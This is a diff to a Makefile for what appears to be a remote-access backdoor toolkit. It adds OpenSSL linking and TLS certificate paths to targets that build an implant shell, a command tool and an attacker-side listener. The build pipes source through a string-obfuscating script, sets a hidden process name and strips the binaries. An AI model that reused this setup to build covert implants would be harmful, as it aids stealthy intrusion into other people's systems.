@@ -6,11 +6,14 @@ BUILD_DIR?=$(PWD)/output
 DESTRINGIFY=perl ../scripts/destringify.pl
 CAT=cat
 DEP_SRC=crypto/aes.c crypto/sha1.c transport/pel.c
+LDFLAGS+=-lssl -lcrypto
 
 include ../.config
 
 shell: CFLAGS+=-DNAME=\"$(HIDE)\" -DAUTH=$(AUTH) -DHTUA=$(HTUA)
 cmd: CFLAGS+=-DAUTH=$(AUTH) -DHTUA=$(HTUA)
+cmd: CFLAGS+=-DCERT_FILENAME=$(PWD)/transport/server-certificate.pem
+cmd: CFLAGS+=-DPRIV_KEY_FILENAME=$(PWD)/transport/server-private-key.pem
 
 # Rules
 
@@ -20,19 +23,19 @@ all: shell cmd
 
 shell: build_dir
 	@ echo "  CC      $(BUILD_DIR)/shell"
-	@ $(CAT) shell.c | $(DESTRINGIFY) | $(CC) $(INCLUDES) $(CFLAGS) $(EXTRA_FLAGS) $(DEP_SRC) -o $(BUILD_DIR)/shell -xc - -lutil
+	@ $(CAT) shell.c | $(DESTRINGIFY) | $(CC) $(INCLUDES) $(CFLAGS) $(EXTRA_FLAGS) $(DEP_SRC) -o $(BUILD_DIR)/shell -xc - $(LDFLAGS) -lutil
 	@ strip $(BUILD_DIR)/shell
 
 cmd: build_dir
 	@ echo "  CC      $(BUILD_DIR)/cmd"
-	@ $(CAT) cmd.c | $(DESTRINGIFY) | $(CC) $(INCLUDES) $(CFLAGS) -o $(BUILD_DIR)/cmd -xc -
+	@ $(CAT) cmd.c | $(DESTRINGIFY) | $(CC) $(INCLUDES) $(CFLAGS) -o $(BUILD_DIR)/cmd -xc - $(LDFLAGS)
 	@ strip $(BUILD_DIR)/cmd
 
 # Those binaries will stay in the attacker machine
 
 listener: build_dir
 	@ echo "  CC      $(BUILD_DIR)/listener"
-	@ $(CC) $(INCLUDES) $(CFLAGS) $(DEP_SRC) client/listener.c -o $(BUILD_DIR)/listener -lreadline
+	@ $(CC) $(INCLUDES) $(CFLAGS) $(DEP_SRC) client/listener.c -o $(BUILD_DIR)/listener $(LDFLAGS) -lreadline
 	@ strip $(BUILD_DIR)/listener
 
 packet: build_dir
